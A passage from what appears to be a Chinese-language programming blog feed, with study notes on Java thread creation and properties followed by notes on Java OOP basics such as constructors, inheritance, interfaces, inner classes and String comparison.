&#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="实现Runnable-重写run-使用匿名内部类"><a href="#实现Runnable-重写run-使用匿名内部类" class="headerlink" title="实现Runnable 重写run 使用匿名内部类"></a>实现Runnable 重写run 使用匿名内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用Runnable和直接继承Thread之间的主要区别"><a href="#使用Runnable和直接继承Thread之间的主要区别" class="headerlink" title="使用Runnable和直接继承Thread之间的主要区别"></a>使用Runnable和直接继承Thread之间的主要区别</h5><p><strong>解耦合</strong>（使用反射 各个功能代码不能交叉 编写封闭的代码）</p><p>模块间的关系越密切，耦合性越强，越独立.<br>比如我去汉堡店打工，负责做美味蟹黄堡，客人太多，Boss又招新人负责分担相同的工作，Boss电脑被黑了，员工里只有我掌握了相关技术，那就只有我能解决问题.</p><p>做美味蟹黄堡是一个任务，我做或者新员工做本质上没有区别.可以把此任务单独提取成Runnable，可以调整执行.</p><p>反入侵只有我能来做，此任务就是和我有耦合关系.<br>两个任务我都可以做，那就是超级加倍！（bushi）与店面正常运转这个任务的耦合度更高.</p><h4 id="基于lambda表达式（推荐）"><a href="#基于lambda表达式（推荐）" class="headerlink" title="基于lambda表达式（推荐）"></a>基于lambda表达式（推荐）</h4><p>Java中不允许函数独立存在（其他语言函数叫 functioin java中叫method方法）<br>lambda 更简化的语法表示方式 “语法糖”【例如 for each for（int x: arr） 】<br>相当于匿名内部类的简单写法<br>lambda 本质上是一个匿名函数（函数式接口 未脱离类） 主要用来实现”回调函数“的效果</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread(<span class="function"><span class="params">()</span> -&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo5</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t.start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;hello main&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p>是的 我们的皇帝遗诏（bushi）<br>非主动调用也非立即调用，在合适的时机进行执行.<br><strong>通常由操作系统、库、框架、别人写的代码进行调用</strong></p><h3 id="Thread的常见构造方法"><a href="#Thread的常见构造方法" class="headerlink" title="Thread的常见构造方法"></a>Thread的常见构造方法</h3><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Thread()</td><td align="center">创建线程对象</td></tr><tr><td align="center">Thread（Runnable taeget）</td><td align="center">使用 Runnable 对象创建线程对象</td></tr><tr><td align="center">Thread（String name）</td><td align="center">创建线程对象，并命名</td></tr><tr><td align="center">Thread（Runnable taeget，String name）</td><td align="center">使用 Runnable 对象创建线程对象，并命名</td></tr><tr><td align="center">Thread(ThreadGroup group, Runnable target)</td><td align="center">线程可以被用来分组管理，分好的组即为线程组</td></tr></tbody></table><p>创建线程的时候 可以去指定name<br>name不影响线程的执行 只是一个命名<br>方便后续调试区分</p><p>线程的入口方法执行结束 线程就被销毁<br>对于主线程来说 入口方法就是main方法 （例如上述t.start一瞬间就执行完毕）</p><h3 id="Thread的几个常见属性"><a href="#Thread的几个常见属性" class="headerlink" title="Thread的几个常见属性"></a>Thread的几个常见属性</h3><table><thead><tr><th>属性</th><th>获取方法</th></tr></thead><tbody><tr><td>ID</td><td>getId（）</td></tr><tr><td>名称</td><td>getName()</td></tr><tr><td>状态</td><td>getState()</td></tr><tr><td>优先级</td><td>getPriority()</td></tr><tr><td>是否后台线程</td><td>isDaemon()</td></tr><tr><td>是否存活</td><td>isAlive()</td></tr><tr><td>是否被中断</td><td>isInterrupted()</td></tr></tbody></table><h5 id="getId（）"><a href="#getId（）" class="headerlink" title="getId（）"></a>getId（）</h5><p>线程的身份标识 标识一个进程中唯一的一个线程<br>（这个id式Java给这个线程分配的 不是系统api提供的线程id 更不是pcb中的id）</p><h5 id="getPriority（）"><a href="#getPriority（）" class="headerlink" title="getPriority（）"></a>getPriority（）</h5><p>虽然提供api 可以获得&#x2F;设置优先级 但很难被察觉<br>优先级影响到的是微观上进行的调度</p><h5 id="isDaemon（）"><a href="#isDaemon（）" class="headerlink" title="isDaemon（）"></a>isDaemon（）</h5><h6 id="守护线程（后台线程）"><a href="#守护线程（后台线程）" class="headerlink" title="守护线程（后台线程）"></a>守护线程（后台线程）</h6><p>不结束不影响整个进程的结束</p><h6 id="前台线程"><a href="#前台线程" class="headerlink" title="前台线程"></a>前台线程</h6><p>一个Java进程中 若前台线程未执行结束 此时整个进程是一定不会结束的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置t为后台线程 一定在start之前</span></span><br><span class="line">t.setDaemon(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">t.start();</span><br></pre></td></tr></table></figure><p>默认情况下一个线程是前台线程,未处理的线程默认为前台线程<br>改成后台线程之后 主进程飞快的结束 此时没有其他前台线程 进程结束 t来不及执行就完了</p><h5 id="isAlive（）"><a href="#isAlive（）" class="headerlink" title="isAlive（）"></a>isAlive（）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程开始&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程结束&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">        t.start();</span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(t.isAlive());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判定内核中的线程是不是被销毁了（回调方法执行完毕 线程就结束了）</p><p>Thread对象的生命周期 比系统内核中的线程更长一些<br>Thread对象还在 内核中的线程已经被销毁<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812144335773.png" alt="image-20240812144335773"></p><p><strong>线程并发执行，并发顺序由系统的调度器决定，不确定.</strong>(极端情况可能主线程卡新线程先打印)</p><p>未完待续❀❀❀</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java基础知识杂记</title>
      <link href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/"/>
      <url>/2024/06/22/Java%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java杂记"><a href="#Java杂记" class="headerlink" title="Java杂记"></a>Java杂记</h2><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112541356.png" alt="image-20240203112541356"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112929728.png" alt="image-20240203112929728"></p><p>静态方法无法继承 无实例化对象</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112627335.png" alt="image-20240203112627335"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112645067.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112823024.png" alt="image-20240203112823024"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112834853.png" alt="image-20240203112834853"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112849352.png" alt="image-20240203112849352"></p><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>数组索引异常<br>空指针异常<br>算数异常<br>丢失资源<br>找不到类<br>编译时异常</p><p>oop 面向对象的语言<br>对象的成员属性在未赋值前<br>引用类型的默认值是NULL<br>见到那类型为对应的0</p><p><strong>通过this可以访问当前对象的成员属性&#x2F;成员变量（静态的成员变量不支持）</strong></p><p>默认<br>int - 0<br>float - 0.0f<br>char - ‘\u0000’<br>boolean - flase</p><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>非特殊的一个方法：<br>1.方法名必须和类名相同<br>2.没有返回值<br>3.创建对象时由编译器自动调用</p><p><strong>当一个类中没有任何一个构造方法时 java会自动提供一个无参的构造方法</strong></p><h4 id="构造方法之间可以形成方法的重载"><a href="#构造方法之间可以形成方法的重载" class="headerlink" title="构造方法之间可以形成方法的重载"></a>构造方法之间可以形成方法的重载</h4><p>1.方法名相同<br>2.参数列表不同</p><p><strong>构造方法只对对象中的成员进行初始化 不进行空间分配</strong></p><h4 id="完成一个对象的构造"><a href="#完成一个对象的构造" class="headerlink" title="完成一个对象的构造"></a>完成一个对象的构造</h4><p>1.分配内存<br>2.调用合适的构造方法</p><p>this（）；调用当前类当中其他构造方法<br>只能在当前的构造方法内部进行使用<br>只能放在第一行</p><p>this.data访问当前对象的属性<br>this.func（）调用当前对象的方法<br>this本身代表当前对象的引用</p><p>就地初始化<br>声明成员变量的同时进行初始化<br>即在class内进行初始化</p><h4 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h4><p>封装 private修饰<br>是数据和操作数据的方法进行有机结合 隐藏对象的属性和实现细节 仅对外公开接口来和对象进行交互<br>对类的成员 进行隐藏 通过关键字private 只是对类对外提供公开的接口<br>意义<br>可以隐藏的实现细节 从而达到安全性<br>继承<br>多态</p><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>更好的管理类<br>多个类收集成为一组 对类或接口很好的组织方式<br>对类、接口等封装机制的体现 </p><p>非静态成员变量属于对象 访问方式 对象的引用.xxx<br>静态成员变量的使用 不依赖于对象（不用实例化 【new】）类名.xxxx<br>静态成员变量（类变量）<br>静态方法  （类方法）</p><p>静态方法内部不能直接调用非静态方法&#x2F;成员变量<br>static方法中不能使用this<br>需通过对象的引用调用静态方法<br>可以通过类名进行访问<br>调用静态方法不需要实例对象</p><p>实例</p><p>静态代码块&gt;实例代码块&gt;构造代码块<br>静态代码块只执行一次</p><p>实例代码块一定是实例化对象的时候被执行</p><p>在java中类的静态变量会被默认初始化<br>构造方法中形参名和成员变量名相同 需要用this指定<br>在类外使用需要使用public访问修饰符</p><p>static只能修饰成员变量 不修饰局部变量</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>当子类和父类是同名成员变量 优先访问子类<br>访问父类-&gt;super关键字<br>this访问既可以访问父类也可以访问子类成员变量 同名时 优先子类<br>super只能访问从父类继承过来的成员变量<br>super在非静态的方法中使用<br>super和this再构造方法调用时 都只能放在第一句 且不能同时出现</p><p>在不同包中访问父子间关系 protected<br>main方法为静态的 所以先创造一个构造方法<br>一个类不想被继承使用final关键字修饰 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">99</span>；</span><br><span class="line">&#125;<span class="comment">//密封类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span>定义 -&gt;常量</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>；</span><br><span class="line">a = <span class="number">20</span>；</span><br></pre></td></tr></table></figure><p>继承 is-a的关系<br>组合是 has-a&#x2F;a part of 的关系</p><h4 id="多态实现条件"><a href="#多态实现条件" class="headerlink" title="多态实现条件"></a>多态实现条件</h4><p>向上转型<br>1.直接赋值<br>2.方法传参的方式<br>3.返回值<br>通过父类引用 调用这个父类 子类重写的方法<br>子类和父类 有同名覆盖&#x2F;重写<br>通过父类对象 调用父类和子类重写的方法<br>满足上述3点 只是会发生动态绑定</p><h4 id="重写-覆盖规则"><a href="#重写-覆盖规则" class="headerlink" title="重写&#x2F;覆盖规则"></a>重写&#x2F;覆盖规则</h4><p>方法名一样<br>参数列表一样 （类型 个数 顺序）<br>返回值一样</p><h4 id="重写的注意事项"><a href="#重写的注意事项" class="headerlink" title="重写的注意事项"></a>重写的注意事项</h4><p>1.被private修饰不可重写<br>2.被static修饰 属于类不属于方法<br>3.被final修饰的方法不可重写<br>4.访问修饰限定符 private&lt;默认权限&lt;protected&lt;public（子类的访问修饰权限一定要大于等于父类的）<br>5.方法的返回值 可以不同 但必须是父子类关系（斜变类型）<br>6.构造方法不能发生重写</p><h4 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h4><p>方法名相同<br>参数列表不同（个数 类型 顺序）<br>返回值不同（可有可无）</p><h4 id="代码的执行顺序"><a href="#代码的执行顺序" class="headerlink" title="代码的执行顺序"></a>代码的执行顺序</h4><p>1.执行父类和子类的静态（先父后子）<br>2.父类的实例<br>3.父类的构造<br>4.子类的实例<br>5.子类的构造</p><p>1.抽象类是被abstract修饰的<br>2.被abstract修饰的方法成为抽象方法  该方可以没有具体实现<br>3.当一个类中含有抽象方法的时候 该类必须使用abstract修饰<br>4.抽象类中可以有和普通类一样的成员变量 一样的成员方法<br>5.抽象类不可被实例化<br>6.抽象类 目的就是为了被继承<br>7.当一个普通的类 继承了抽象类之后 该普通类一定要重写抽象类当中的所有抽象方法<br>8.fina、privatel和abstract不能同时存在（fina、privatel修饰一定不能重写 abstract修饰一定要重写）抽象类不能被static修饰<br>9.当一个抽象类A不想被一个普通类B继承 此时可以把这个类变成抽象类 当一个普通类C继承抽象类B之后 C要重写B和A当中所有的抽象方法<br>10.当一个类实现接口当中的方法之后 当前类当中的方法必须加public<br>抽象类中不一定包含抽象方法 但有抽象方法的类一定是抽象类<br>抽象类中可以有构造方法 供子类创建对象时 初始化父类的成员变量<br>11.接口当中不能有构造方法和代码块<br>12.一个接口也会产生独立的字节码文件 （编译之后.class）<br>13.类没有实现接口中的所有方法 那它必须设置为抽象类</p><p>匿名对象的缺点 每次使用都得重新实例化</p><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>1.使用interface定义接口<br>2.接口当中的成员变量 默认是public static final<br>3.接口当中的成员方法 默认是public abstract 一般情况下不写<br>4.接口当中不可以有普通的方法<br>5.java8开始 允许在接口中定义一个default方法 修饰普通类<br>6.接口当中的方法若被static修饰的方法 可以有具体的实现<br>7.接口不能通过new关键字进行实例化<br>8.类和接口之间可以通过关键字implements实现接口 实现之后要重写所有的方法<br>9.接口可以发生向上转型 动态绑定</p><p><strong>先继承再实现接口 java中只能继承一个类实现多个接口</strong><br>接口成员变量默认：public static final<br>接口当中成员方法默认：public abstract</p><p><strong>抽象类和接口都不可以实例化</strong><br>抽象类A继承抽象类B 抽象类A可以不重写抽象类B中的方法 如果是普通类继承 需要重写</p><p>接口间的继承相当于合并 </p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135046040.png" alt="image-20240203135046040"></p><h4 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h4><p>核心区别<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135240178.png" alt="image-20240203135240178"></p><h4 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h4><p>所有类的父类 尽管无显示继承（默认继承）<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203141628670.png" alt="image-20240203141628670"></p><p>equals方法返回true或false<br><strong>以后自定义的类型 一定重写equals方法</strong><br>equals方法不能用于基本数据类型的变量（Byte，short，int，long，double，folat，<a href="https://so.csdn.net/so/search?q=boolean&spm=1001.2101.3001.7020">boolean</a>，char）</p><p><strong>“&#x3D;&#x3D;”比较基本数据类型时比较的是表面值内容，而比较两个对象时比较的是两个对象的内存地址值</strong><br><strong>&#x3D;&#x3D; 在基本数据类型：值内容, 引用类型时：地址</strong><br><strong>equals 重写：值内容 ， equals不重写：地址</strong></p><p>重写hashcode 使得两个对象 逻辑上在同一个位置<br>自定义类型 比较大小 实现compareable接口<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203144521872.png" alt="image-20240203144521872"></p><p>此接口对类的侵入性较强 可扩展性弱</p><p>不同包的不同访问<br>clone方法的异常是受查异常&#x2F;编译时异常 必须是编译时处理<br>向下转型 需要强制类型转换<br>空接口-&gt; 标记接口 证明当前类是可以被克隆的</p><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>并没有对对象中的对象进行克隆</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203162918839.png" alt="image-20240203162918839"></p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203163553312.png" alt="image-20240203163553312"></p><p>看代码的实现过程</p><h4 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4><p>一个类一个字节码文件</p><p><strong>实例内部类</strong></p><p>获取实例内部类对象时 依赖外部类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OutClass.<span class="type">InnerClass</span> <span class="variable">innerClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutClass</span>.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();</span><br><span class="line">innerClass.test();</span><br></pre></td></tr></table></figure><p><strong>在实例内部内中 定义静态的成员变量需要使用public static final</strong><br>原因：静态方法首先执行且不依赖任何对象 但内部类的实现依赖外部类<br>final修饰常量 不需要类加载 </p><p>类加载的时候不会加载普通成员变量 实例内部类中存在static static是在类加载的时候创建的</p><p>当外部类中的数据成员和内部类中的数据成员相同时 可以通过外部类.this访问外部类成员变量（OuterClass.this）<br>实例内部类对象中包含外部类的this 因此可以通过内部类访问外部类的成员变量（public权限）</p><p><strong>注意</strong><br>1.外部类中的任何成员都可以在实例内部类方法中直接访问<br>⒉.实例内部类所处的位置与外部类成员位置相同，因此也受public、private等访问限定符的约束<br>3.在实例内部类方法中访问同名的成员时，优先访问自己的，如果要访问外部类同名的成员，必须:外部类名称.this.同名成员来访问<br>4.实例内部类对象必须在先有外部类对象前提下才能创建<br>5.实例内部类的非静态方法中包含了一个指向外部类对象的引用<br>6.外部类中，不能直接访问实例内部类中的成员，如果要访问必须先要创建内部类的对象。</p><p><strong>静态内部类</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164615108.png" alt="image-20240203164615108"></p><p>获取静态内部类对象</p><p>在静态内部类中范根外部类的非静态数据成员<br>内部类为静态 直接访问即可</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OuterClass outclass <span class="operator">=</span> new OuterClass（）<span class="comment">;</span></span><br><span class="line">System.out.println(outerclass.data1)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>在静态内部类中蓄能访问外部类中的静态成员（要访问 提供外部类对象的引用）<br>创建静态内部类对象是 不需要先创建外部类对象</p><p><strong>匿名内部类</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164446363.png" alt="image-20240203164446363"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164524232.png" alt="image-20240203164524232"></p><p>外部类名$内部类名<br>外部类类名$数字<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164907493.png" alt="image-20240203164907493"></p><p>在匿名内部类中 能够被访问的是没有被修改过的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">implementationvoid <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"> a = <span class="keyword">new</span> <span class="title class_">A</span>(()&#123;</span><br><span class="line"> <span class="meta">@override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//默认在这里访问的是被final修饰的</span></span><br><span class="line">system.out.println(<span class="string">&quot;值: &quot;</span>+val);<span class="comment">//在匿名内部类当中能够访问的是没有被修改过的数据&#125;</span></span><br><span class="line">&#125;;</span><br><span class="line">a.test();</span><br><span class="line">val = <span class="number">100</span>;|</span><br><span class="line">system.out.println(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;；</span><br><span class="line">a.test();</span><br></pre></td></tr></table></figure><p><strong>局部内部类</strong></p><p>只能定义在方法内部<br>1.局部内部类只能在所定义的方法本内部使用<br>2.不能被public、static等修饰符修饰<br>3.编译器也有自己独立的字节码文件<br>命名格式:外部类名字$数字内部类名字.class4.几乎不会使用</p><h4 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h4><h5 id="比较是否引用同一个对象"><a href="#比较是否引用同一个对象" class="headerlink" title="&#x3D;&#x3D;比较是否引用同一个对象"></a>&#x3D;&#x3D;比较是否引用同一个对象</h5><p> 任何情况下只要等号两边是引用类型一定注意看此时比较的是什么?如何要比较两个引用所指向对象的内容是否一致</p><p>一定重写equals方法–&gt;<br>不重写就会默认调用object的equals方法</p><p>自定义类型一定要重写equels（）方法</p><p>区别于C语言 java中的字符串没有’\0’结尾<br>子类重写了父类的方法后进行调用 优先调用子类自己的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3 == str4);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240208201812965.png" 